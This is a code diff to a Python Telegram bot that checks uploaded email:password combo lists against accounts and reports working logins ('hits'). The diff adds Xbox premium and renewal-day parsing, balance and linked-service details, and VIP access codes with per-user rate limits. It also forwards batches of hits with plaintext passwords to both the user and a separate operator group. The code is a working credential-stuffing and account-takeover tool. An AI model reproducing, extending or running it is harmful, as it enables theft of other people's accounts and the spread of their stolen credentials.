@@ -39,6 +39,46 @@ def edit_message(chat_id, message_id, text):
     data = {"chat_id": chat_id, "message_id": message_id, "text": text}
     return api("editMessageText", data)
 
+# ------------------- Access control / VIP -------------------
+CONTROL_GROUP_ID = int(os.getenv("CONTROL_GROUP_ID", "-1002789978571"))
+ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
+VIP_WINDOW_SECONDS = 2 * 60 * 60  # 2 hours for normal users
+NORMAL_LIMIT = 100
+
+vip_codes = {}     # code -> {"expires": ts, "claimed_by": None or user_id}
+vip_users = set()  # user ids
+user_usage = {}    # user_id -> {"start": ts, "count": int}
+
+def set_vip_code(code, minutes):
+    expires = time.time() + int(minutes) * 60
+    vip_codes[code] = {"expires": expires, "claimed_by": None}
+
+def try_claim_vip(user_id, code):
+    info = vip_codes.get(code)
+    if not info:
+        return False, "Code not found"
+    if time.time() > info["expires"]:
+        return False, "Code expired"
+    if info["claimed_by"] and info["claimed_by"] != user_id:
+        return False, "Code already used"
+    info["claimed_by"] = user_id
+    vip_users.add(user_id)
+    return True, "VIP activated"
+
+def check_user_limit(user_id, new_count):
+    if user_id in vip_users:
+        return True, 0
+    rec = user_usage.get(user_id)
+    now = time.time()
+    if not rec or now - rec["start"] > VIP_WINDOW_SECONDS:
+        user_usage[user_id] = {"start": now, "count": 0}
+        rec = user_usage[user_id]
+    if rec["count"] + new_count > NORMAL_LIMIT:
+        remaining = int((VIP_WINDOW_SECONDS - (now - rec["start"])) / 60) + 1
+        return False, max(remaining, 1)
+    rec["count"] += new_count
+    return True, 0
+
 def send_document(chat_id, path, caption=None):
     with open(path, "rb") as f:
         files = {"document": f}
@@ -416,11 +456,24 @@ class UnifiedChecker:
                     }
                     for k, nm in kw.items():
                         if k in t:
-                            days = "?"
-                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', t)
+                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', t)
+                            details = nm
+                            # compute remaining days if available
                             if m:
-                                days = m.group(1)
-                            xbox = {"status": "PREMIUM", "details": nm}
+                                days = get_remaining_days(m.group(1))
+                                try:
+                                    if days.startswith('-'):
+                                        # expired -> treat as FREE (do not show)
+                                        break
+                                    else:
+                                        details = f"{nm} ({days}d)"
+                                except:
+                                    details = nm
+                            if m:
+                                # if renewal date present and not expired, mark premium
+                                xbox = {"status": "PREMIUM", "details": details}
+                            else:
+                                xbox = {"status": "PREMIUM", "details": nm}
                             break
             except:
                 pass
@@ -750,14 +803,20 @@ def format_result(res):
     email = res.get("email", "")
     password = res.get("password", "")
     country = (res.get("country") or "??").strip().upper()
+    parts = [f"{email}:{password}", country]
     xbox = res.get("xbox", {}) or {}
-    xdet = xbox.get("details") or xbox.get("status") or ""
-    xbox_text = f"Xbox: {xdet if xdet else 'none'}"
+    xdet = xbox.get("details") or ""
+    if xdet and (xbox.get("status","").upper() != "FREE"):
+        parts.append(f"Xbox: {xdet}")
     balance_text = build_balance_text(res.get("ms_data", {}))
+    if balance_text:
+        parts.append(balance_text)
     services = res.get("services", {}) or {}
     svc_list = [k for k, v in services.items() if v]
-    svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
-    return f"{email}:{password} | {country} | {xbox_text} | {balance_text} | {svc_text}"
+    if svc_list:
+        svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
+        parts.append(svc_text)
+    return " | ".join(parts)
 
 def _take(lst, n):
     out = []
@@ -832,12 +891,16 @@ class ScanSession:
     def __init__(self, chat_id):
         self.chat_id = chat_id
         self.stop_ev = threading.Event()
-        self.results = []
+        self.results = []                 # hit lines
+        self.results_services = []        # services-only lines
+        self.results_xbox = []            # xbox premium-only lines
         self.total = 0
         self.checked = 0
         self.hits = 0
         self.bads = 0
-        self.batch = []
+        self.batch = []                   # hit lines batch
+        self.batch_services = []          # services-only batch
+        self.batch_xbox = []              # xbox premium-only batch
         self.hits_batch_lock = threading.Lock()
         self.last_status_time = 0.0
         self.awaiting_domain = False
@@ -898,7 +961,23 @@ class BotApp:
                     send_document(GROUP_ID, path, caption=f"Hits batch ({len(sess.batch)})")
                 except:
                     pass
-                sess.batch.clear()
+                # services-only
+                if sess.batch_services:
+                    spath = os.path.join(os.getcwd(), f"services_batch_{int(time.time())}.txt")
+                    with open(spath, "w", encoding="utf-8") as sf:
+                        sf.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch_services])
+                    send_document(chat_id, spath, caption=f"Services batch ({len(sess.batch_services)})")
+                    try: send_document(GROUP_ID, spath, caption=f"Services batch ({len(sess.batch_services)})")
+                    except: pass
+                # xbox-only
+                if sess.batch_xbox:
+                    xpath = os.path.join(os.getcwd(), f"xbox_batch_{int(time.time())}.txt")
+                    with open(xpath, "w", encoding="utf-8") as xf:
+                        xf.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in sess.batch_xbox])
+                    send_document(chat_id, xpath, caption=f"Xbox batch ({len(sess.batch_xbox)})")
+                    try: send_document(GROUP_ID, xpath, caption=f"Xbox batch ({len(sess.batch_xbox)})")
+                    except: pass
+                sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()
             except:
                 pass
 
@@ -927,10 +1006,25 @@ class BotApp:
             with self.lock:
                 sess.checked += 1
             if r and r.get("status") == "HIT":
+                # Build lines
                 line = format_result(r)
+                # services-only line
+                sv = r.get("services", {}) or {}
+                sv_found = [k for k, v in sv.items() if v]
+                services_line = f"{r.get('email','')}:{r.get('password','')} | Services: {', '.join(sv_found)}" if sv_found else None
+                # xbox-only line (premium and not expired shows details)
+                xbox_line = None
+                xb = (r.get("xbox") or {})
+                xdet = xb.get("details") or ""
+                if (xb.get("status","").upper() != "FREE") and xdet:
+                    xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
                 with self.lock:
                     sess.results.append(line)
                     sess.hits += 1
+                    if services_line:
+                        sess.results_services.append(services_line)
+                    if xbox_line:
+                        sess.results_xbox.append(xbox_line)
                     # update aggregates
                     xb = (r.get("xbox") or {}).get("status", "").upper()
                     if xb and xb != "FREE":
@@ -944,6 +1038,10 @@ class BotApp:
                 # Batch-send every 100 hits
                 with sess.hits_batch_lock:
                     sess.batch.append(line)
+                    if services_line:
+                        sess.batch_services.append(services_line)
+                    if xbox_line:
+                        sess.batch_xbox.append(xbox_line)
                     if len(sess.batch) >= 100:
                         pass
                 if len(sess.batch) >= 100:
@@ -998,9 +1096,19 @@ class BotApp:
         if not data:
             send_message(chat_id, "Cannot download file")
             return
+        # rate limit check (per user)
+        allow, mins = check_user_limit(chat_id, 0)
+        if not allow:
+            send_message(chat_id, f"Limit reached. Try again in ~{mins} minutes.")
+            return
         accounts = parse_accounts_bytes(data)
         if not accounts:
             send_message(chat_id, "No valid accounts found")
+            return
+        # enforce limit against the number of accounts about to scan
+        allow, mins = check_user_limit(chat_id, len(accounts))
+        if not allow:
+            send_message(chat_id, f"Only VIP can scan more now. Try again in ~{mins} minutes.")
             return
         # Ask for optional domain
         sess = ScanSession(chat_id)
@@ -1035,6 +1143,18 @@ class BotApp:
                     if "message" in upd:
                         m = upd["message"]
                         chat_id = m["chat"]["id"]
+                        from_id = m.get("from", {}).get("id")
+                        # control group admin commands
+                        if m["chat"].get("id") == CONTROL_GROUP_ID and from_id == ADMIN_ID and "text" in m:
+                            txt = m["text"].strip()
+                            # Expected: code ( vip <code> ) , time : <minutes>
+                            import re as _re
+                            mm = _re.search(r'code\s*\(\s*vip\s+(\S+)\s*\)\s*,\s*time\s*:\s*(\d+)', txt, _re.I)
+                            if mm:
+                                code, minutes = mm.group(1), mm.group(2)
+                                set_vip_code(code, int(minutes))
+                                send_message(CONTROL_GROUP_ID, f"VIP code set: {code} for {minutes} minutes")
+                                continue
                         if "document" in m:
                             fid = m["document"]["file_id"]
                             # announce to group who started and from where
@@ -1050,6 +1170,13 @@ class BotApp:
                             txt = m["text"].strip()
                             if txt.lower() in ("/start", "start"):
                                 send_message(chat_id, "Please send a text file (email:pass per line) to begin scanning.")
+                                continue
+                            # user claims VIP code
+                            if txt.lower().startswith("code") or txt.lower().startswith("vip"):
+                                parts = txt.replace(":", " ").split()
+                                code = parts[-1] if len(parts) >= 2 else ""
+                                ok, msg = try_claim_vip(from_id, code)
+                                send_message(chat_id, msg)
                                 continue
                             if txt.lower() == "stop":
                                 self.handle_stop(chat_id)
